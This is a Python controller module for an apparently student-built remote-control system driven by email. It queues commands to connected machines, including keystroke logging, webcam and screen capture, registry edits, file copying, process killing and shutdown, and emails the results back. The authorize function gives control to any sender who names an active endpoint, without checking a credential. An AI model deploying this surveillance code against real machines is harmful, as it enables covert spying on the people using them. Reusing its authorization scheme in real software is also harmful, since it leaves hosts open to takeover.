"""Action handlers for remote-control commands delivered via email.

This module keeps track of authenticated controller email addresses and their
associated target connections, exposes small helper functions for mapping
between emails and connection addresses, and enqueues concrete actions to be
performed on active TCP connections. Each public function prepares a callable
that will be executed against a given connection to satisfy the requested
operation (process listing, application management, webcam/screen capture,
registry operations, directory actions, shutdown/log out, etc.). Results are
reported back to the controller via the `SMTP_service.send_threading` helper.
"""

import os
import re
from collections import defaultdict
from queue import Queue
from random import choices
from time import sleep

import cv2

from socket_email.server_control.mail_provider_handle import SMTP_service as sp
from socket_email.server_control.old_handle import (
    app_process_server,
    mac_address_server,
    shutdown_logout_server,
)

BUFSIZ = 4 * 1024

conn_ip_list = []  # list_ip() # Tuple (conn, addr)

auth_dict = defaultdict(lambda: False)  # MAIL -> bool
email_ip_dict = {}  # MAIL -> IP
ip_email_dict = {}  # IP -> MAIL (inverse function)

action_dictionary = {}


def is_valid_ip(ip):
    """Return True if ``ip`` matches the pattern ``<IPv4>:<port>``.

    The IPv4 segment accepts 0–255 per octet and the port segment accepts
    0–65535. This is used to validate user-provided endpoints from commands.

    Parameters
    ----------
    ip: str
        Endpoint string in the form ``"a.b.c.d:port"``.

    Returns
    -------
    bool
        True when the input conforms to the pattern; otherwise False.
    """
    ip_address = "([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])"
    port = "([0-9]|[1-9][0-9]|[1-9][0-9]{2}|[1-9][0-9]{3}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])"
    ip_pattern = re.compile(
        r"^"
        + ip_address
        + "\\."
        + ip_address
        + "\\."
        + ip_address
        + "\\."
        + ip_address
        + "\\:"
        + port
        + "$"
    )

    return bool(ip_pattern.match(ip))


def authorize(email, ip):
    """Authorize an email to control a connection and notify via email.

    Records bidirectional mappings between ``email`` and the target ``ip``
    (``(host, port)`` tuple) if the connection is currently active. Sends an
    AUTH acknowledgement or an informational message when already authorized.

    Parameters
    ----------
    email: str
        Controller email address.
    ip: tuple[str, int]
        Target connection address as ``(host, port)``.
    """
    if ((email not in auth_dict) or (not auth_dict[email])) and ip in [
        elem[1] for elem in conn_ip_list
    ]:
        auth_dict[email] = True
        email_ip_dict[email] = ip
        ip_email_dict[ip] = email
        sp.send_threading(email, "AUTH", "OK")
    else:
        sp.send_threading(email, "AUTH", "ALREADY AUTHORIZED / CONTROLLED")


def list_ip(email):
    """Send the list of active connection endpoints to ``email``.

    The list is formatted as ``host:port`` lines and delivered using the
    SMTP service under the LIST subject.
    """
    ips = "\n".join([elem[1][0] + ":" + str(elem[1][1]) for elem in conn_ip_list])
    sp.send_threading(email, "LIST", ips)


def disconnect(email):
    """Revoke authorization for ``email`` and clear associated mappings.

    Always sends a DISC status email; returns OK when revocation occurred,
    otherwise informs the caller that authorization was not established.
    """
    if email in auth_dict and auth_dict[email]:
        auth_dict[email] = False
        ip_email_dict[email_ip_dict[email]] = None
        email_ip_dict[email] = None

        sp.send_threading(email, "DISC", "OK")
    sp.send_threading(email, "DISC", "NOT AUTH YET")


def find_corresponding_email(ip_address):
    """Return the controller email mapped to ``ip_address``, if any."""
    for i in email_ip_dict:
        if email_ip_dict[i] == ip_address:
            return i


def delete_ip_from_list(ip_address):
    """Remove the connection tuple that matches ``ip_address`` from cache."""
    to_delete = None
    for i in range(len(conn_ip_list)):
        if conn_ip_list[i][1] == ip_address:
            to_delete = conn_ip_list[i]
            break
    if to_delete is not None:
        conn_ip_list.remove(to_delete)


def remove_this_connection(conn, ip_address):
    """Close ``conn``, drop it from the active list and revoke controller.

    After closing, the email that was mapped to ``ip_address`` is disconnected.
    """
    conn.close()
    delete_ip_from_list(ip_address)
    email = find_corresponding_email(ip_address)
    disconnect(email)


def __init__():
    """Initialize per-connection action queues for existing connections."""
    for i in conn_ip_list:
        action_dictionary[i[1]] = Queue(maxsize=0)


def list_process(ip_address):
    """Enqueue an action to fetch running processes from the remote host."""
    def action_message(conn):
        (
            conn.sendall(bytes("APP_PRO", "utf8")),
        )  # NHO DIEN THEM CAI NAY (TRONG FILE CLIENT.PY)

        result = app_process_server._list(conn, "PROCESS")
        sp.send_threading(ip_email_dict[ip_address], "LIST PROCESS", str(result))
        # print(result)

    action_dictionary[ip_address].put(action_message)


def list_application(ip_address):
    """Enqueue an action to fetch installed/active applications on the host."""
    def action_message(conn):
        conn.sendall(bytes("APP_PRO", "utf8"))

        result = app_process_server._list(conn, "APPLICATION")
        sp.send_threading(ip_email_dict[ip_address], "LIST APP", str(result))
        # print(result)

    action_dictionary[ip_address].put(action_message)


def kill_process(ip_address, id):
    """Enqueue an action to terminate a process by its identifier."""
    def action_message(conn):
        conn.sendall(bytes("APP_PRO", "utf8"))

        result = app_process_server.send_kill(conn, id)
        sp.send_threading(ip_email_dict[ip_address], "KILL PROCESS", str(result))
        # print(result)

    action_dictionary[ip_address].put(action_message)


def kill_application(ip_address, id):
    """Enqueue an action to terminate an application by identifier."""
    def action_message(conn):
        conn.sendall(bytes("APP_PRO", "utf8"))

        result = app_process_server.send_kill(conn, id)
        sp.send_threading(ip_email_dict[ip_address], "KILL APP", str(result))
        # print(result)

    action_dictionary[ip_address].put(action_message)


def capture_webcam(ip_address, time=5):
    """Enqueue a webcam capture on the remote host and email the result.

    Parameters
    ----------
    ip_address: tuple[str, int]
        Target endpoint.
    time: int | float
        Capture duration in seconds.
    """
    def action_message(conn):
        conn.sendall(b"WEBCAM".ljust(BUFSIZ))
        conn.sendall(str(time).encode().ljust(BUFSIZ))

        # Recv phase
        try:
            size_to_recv = int(conn.recv(BUFSIZ).decode("utf8"))
            data_to_recv = b""
            for idx in range(0, size_to_recv, BUFSIZ):
                r = conn.recv(BUFSIZ)
                data_to_recv += r
            data_to_recv = data_to_recv[:size_to_recv]  # Remove additional bytes
            sp.send_threading(
                ip_email_dict[ip_address], "WEBCAM", data_to_recv, "file.avi"
            )
        except Exception:
            sp.send_threading(ip_email_dict[ip_address], "WEBCAM", "FAIL")

    action_dictionary[ip_address].put(action_message)


def create_video(image_folder: str):
    """Create a simple AVI video from ``.png`` frames in ``image_folder``.

    Returns the generated file name in the current working directory.
    """
    character_list = "abcdefghijklm_"
    video_name = (
        "".join(choices(character_list, k=5)) + "video.avi"
    )  # Random video name!

    images = [img for img in os.listdir(image_folder) if img.endswith(".png")]
    frame = cv2.imread(os.path.join(image_folder, images[0]))
    height, width, layers = frame.shape

    video = cv2.VideoWriter(video_name, 0, 1, (width, height))

    for image in images:
        video.write(cv2.imread(os.path.join(image_folder, image)))

    cv2.destroyAllWindows()
    video.release()
    return video_name


def capture_screen(
    ip_address, time=0.5
):  # Not done ! need more fix for multi threading
    """Enqueue periodic screenshot capture and return a stitched video.

    The client sends a stream of frame sizes and bytes until an END marker is
    received. Frames are saved to a temporary directory and then converted to
    an AVI video that is emailed back to the controller.
    """
    def action_message(conn):
        conn.sendall(b"LIVESCREEN".ljust(BUFSIZ))
        str_time = str(time).encode().ljust(BUFSIZ)
        conn.sendall(str_time)

        # number_of_images = 10
        n = 1
        character_list = "abcdefghijklm_"

        screenshots_directory = (
            "./" + "".join(choices(character_list, k=5)) + "screenshots"
        )

        if not os.path.exists(screenshots_directory):
            os.makedirs(screenshots_directory)

        while True:
            print("n = ", n)
            msg = conn.recv(BUFSIZ).decode("utf8")
            print("Message:", msg)
            if "END" in msg:
                break
            msg = msg.strip()
            print("Message:", msg, "1")
            print(len(msg))
            if len(msg) == 0:
                break
            print(msg)

            size_to_recv = int(msg)
            print("size_to_recv = ", size_to_recv)

            data_to_recv = b""
            for idx in range(0, size_to_recv, BUFSIZ):
                r = conn.recv(BUFSIZ)
                data_to_recv += r
            data_to_recv = data_to_recv[:size_to_recv]  # Remove additional bytes
            file_name = screenshots_directory + "/{}.png".format(n)
            print("file_name = ", file_name)
            with open(file_name, "wb") as f:
                f.write(data_to_recv)
            n += 1

        video_name = create_video(screenshots_directory)

        files_list = os.listdir(screenshots_directory)
        for file in files_list:
            os.remove(os.path.join(screenshots_directory, file))

        with open(video_name, "rb") as f:
            file_data = f.read()
        sp.send_threading(
            ip_email_dict[ip_address], "LIVESCREEN", file_data, "file.avi"
        )

    action_dictionary[ip_address].put(action_message)


def shut_down(ip_address):
    """Enqueue a system shutdown on the remote host and notify by email."""
    def action_message(conn):
        shutdown_logout_server.shutdown(conn)

        remove_this_connection(conn, ip_address)

        result = "OK"
        sp.send_threading(ip_email_dict[ip_address], "SHUTDOWN", result)

    action_dictionary[ip_address].put(action_message)


def logout(ip_address):
    """Enqueue a user log out on the remote host and notify by email."""
    def action_message(conn):
        shutdown_logout_server.logout(conn)

        remove_this_connection(conn, ip_address)

        result = "OK"
        sp.send_threading(ip_email_dict[ip_address], "LOGOUT", result)

    action_dictionary[ip_address].put(action_message)


def restart(ip_address):
    """Enqueue a system restart on the remote host and notify by email."""
    def action_message(conn):
        shutdown_logout_server.restart(conn)

        remove_this_connection(conn, ip_address)

        result = "OK"
        sp.send_threading(ip_email_dict[ip_address], "RESTART", result)

    action_dictionary[ip_address].put(action_message)


def mac_address(ip_address):
    """Enqueue a MAC address query and send the result to the controller."""
    def action_message(conn):
        conn.sendall(bytes("MAC", "utf8"))

        result = mac_address_server.mac_address(conn)
        sp.send_threading(ip_email_dict[ip_address], "MAC", result)
        # print(result)

    action_dictionary[ip_address].put(action_message)


def keylog(ip_address, time=10):
    """Enqueue keystroke logging for ``time`` seconds and email the log."""
    def action_message(conn):
        conn.sendall(bytes("KEYLOG", "utf8"))
        conn.sendall(b"HOOK".ljust(BUFSIZ))
        sleep(time)
        conn.sendall(b"HOOK".ljust(BUFSIZ))
        conn.sendall(b"PRINT".ljust(BUFSIZ))

        data = conn.recv(BUFSIZ)
        sp.send_threading(ip_email_dict[ip_address], "KEYLOG", data.decode("utf8"))

    action_dictionary[ip_address].put(action_message)


def registry_list(ip_address, full_path):
    """Enqueue a registry listing at ``full_path`` and email the result."""
    def action_message(conn):
        conn.sendall(bytes("REGISTRY", "utf8"))
        conn.sendall(bytes("LIST ", "utf8"))
        conn.sendall(bytes(full_path, "utf8"))
        # receive all data from the client
        size_to_recv = int(conn.recv(BUFSIZ).decode("utf8"))
        data_to_recv = b""
        for _ in range(0, size_to_recv, BUFSIZ):
            r = conn.recv(BUFSIZ)
            data_to_recv += r
        data_to_recv = data_to_recv[:size_to_recv]
        sp.send_threading(
            ip_email_dict[ip_address], "REGISTRY LIST", data_to_recv.decode("utf8")
        )
        # print(data_to_recv)

    action_dictionary[ip_address].put(action_message)


def registry_update(ip_address, absolute_path, value, data_type):
    """Enqueue a registry value update for the provided path and value."""
    def action_message(conn):
        conn.sendall(bytes("REGISTRY", "utf8"))
        conn.sendall(bytes("UPDATE ", "utf8"))
        conn.sendall(bytes(absolute_path, "utf8"))
        conn.sendall(bytes(" ", "utf8"))
        conn.sendall(bytes(value, "utf8"))
        conn.sendall(bytes(" ", "utf8"))
        conn.sendall(bytes(data_type, "utf8"))

        ack = conn.recv(BUFSIZ).decode("utf8")
        sp.send_threading(ip_email_dict[ip_address], "REGISTRY UPDATE", ack)
        # print(ack)

    action_dictionary[ip_address].put(action_message)


def dir_list(ip_address, path_to_folder):
    """Enqueue a directory listing for ``path_to_folder`` and email it."""
    def action_message(conn):
        conn.sendall(bytes("DIRECTORY", "utf8"))
        conn.sendall(bytes("LIST ", "utf8"))
        conn.sendall(bytes(path_to_folder, "utf8"))
        size_to_recv = int(conn.recv(BUFSIZ).decode("utf8"))
        data_to_recv = b""
        for _ in range(0, size_to_recv, BUFSIZ):
            r = conn.recv(BUFSIZ)
            data_to_recv += r

        data_to_recv = data_to_recv[:size_to_recv]
        # print(data_to_recv.decode('utf8'))
        sp.send_threading(
            ip_email_dict[ip_address], "DIR LIST", data_to_recv.decode("utf8")
        )

    action_dictionary[ip_address].put(action_message)


def dir_copy(ip_address, src_path, dst_path):
    """Enqueue a directory file copy from ``src_path`` to ``dst_path``."""
    def action_message(conn):
        conn.sendall(bytes("DIRECTORY", "utf8"))
        conn.sendall(bytes("COPY ", "utf8"))
        conn.sendall(bytes(src_path, "utf8"))
        conn.sendall(bytes(" ", "utf8"))
        conn.sendall(bytes(dst_path, "utf8"))

        ack = conn.recv(BUFSIZ).decode("utf8")
        sp.send_threading(ip_email_dict[ip_address], "DIR COPY", ack)
        # print(ack)

    action_dictionary[ip_address].put(action_message)


def raise_error_message(error_message):
    """Emit an error message for debugging or operator visibility."""
    print(error_message)
